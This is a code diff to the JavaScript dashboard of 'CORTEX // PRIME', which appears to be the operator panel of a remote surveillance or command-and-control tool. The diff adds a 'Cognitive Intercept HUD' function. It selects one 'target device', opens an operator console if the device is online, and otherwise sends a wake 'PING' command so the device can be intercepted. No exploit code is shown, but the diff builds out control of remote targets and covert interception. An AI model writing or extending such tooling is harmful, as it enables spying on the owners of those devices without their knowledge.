@@ -309,6 +309,7 @@
     <header>
         <div class="logo" onclick="handleLogoClick()">CORTEX // PRIME</div>
         <div style="display:flex; gap:15px; align-items:center;">
+            <div onclick="initiateInterception()" style="cursor:pointer; font-size:1.2rem; color:var(--success);" title="COGNITIVE INTERCEPT HUD">🎙️</div>
             <div onclick="showHelpGuide()" style="cursor:pointer; font-size:1.2rem; color:var(--success);" title="SYSTEM GUIDE">❓</div>
             <div onclick="toggleSettingsModal()" style="cursor:pointer; font-size:1.2rem; color:var(--primary);" title="UPLINK SETTINGS">⚙️</div>
             <div onclick="toggleSearch()" style="cursor:pointer; font-size:1.2rem; color:var(--primary);">🔍</div>
@@ -375,13 +376,7 @@
         </div>
 
         <div id="view-dash" class="section active">
-            <div class="sticky-controls" style="display: flex; justify-content: space-between; align-items: center;">
-                <div style="display:flex; align-items:center; gap:15px;">
-                    <h2 data-search="cluster, active, targets, signal, radar" style="margin:0">Uplink Detection Radar</h2>
-                    <button class="btn" id="op-hud-btn" onclick="openOperatorConsole()" style="display:none; border-color:var(--success); color:var(--success); font-size:0.6rem; padding:4px 8px;">🎙️ COGNITIVE INTERCEPT HUD</button>
-                </div>
-                <button class="btn" onclick="fetchLatest()" style="font-size: 0.6rem; padding: 4px 8px;">REFRESH SCAN</button>
-            </div>
+            <h2 data-search="cluster, active, targets, signal, radar" style="margin-top:0">Uplink Detection Radar</h2>
 
             <!-- Hacker Style Circular Radar -->
             <div class="radar-container" id="radar-screen">
@@ -1516,17 +1511,6 @@
                     </div>
                 `;
             }).join('');
-            
-            // Manage visibility of the cognitive intercept HUD button based on target selection and online state
-            const opHudBtn = document.getElementById('op-hud-btn');
-            if (selectedDeviceIds.size === 1) {
-                const targetId = Array.from(selectedDeviceIds)[0];
-                const targetDev = allDevices.find(d => d.device_id === targetId);
-                const isOnline = targetDev && (new Date() - new Date(targetDev.created_at)) < 90000;
-                opHudBtn.style.display = isOnline ? 'block' : 'none';
-            } else {
-                opHudBtn.style.display = 'none';
-            }
         }
 
         function updateFeed(dev, rawData = []) {
@@ -3573,6 +3557,34 @@
             if (opChannel) { 
                 sb.removeChannel(opChannel);
                 opChannel = null;
+            }
+        }
+
+        async function initiateInterception() {
+            if (selectedDeviceIds.size === 0) {
+                return toast("SELECT A TARGET DEVICE FIRST", "danger");
+            }
+            if (selectedDeviceIds.size > 1) {
+                return toast("HUD SUPPORTS SINGLE-TARGET INTERCEPT ONLY", "danger");
+            }
+
+            const targetId = Array.from(selectedDeviceIds)[0];
+            const dev = allDevices.find(d => d.device_id === targetId);
+            
+            if (!dev) return toast("TARGET DATA CORRUPTED", "danger");
+
+            const diffMs = new Date() - new Date(dev.created_at);
+            const isOnline = diffMs < 90000;
+
+            if (isOnline) {
+                openOperatorConsole();
+            } else {
+                toast("TARGET OFFLINE. SENDING WAKE PING...", "success");
+                // Send the Ping command automatically to attempt to wake the device
+                await sendCmd('PING', 'WAKE_FOR_HUD_INTERCEPT');
+                setTimeout(() => {
+                    toast("TARGET UNRESPONSIVE. AWAITING SIGNAL...", "danger");
+                }, 2000);
             }
         }
     </script>
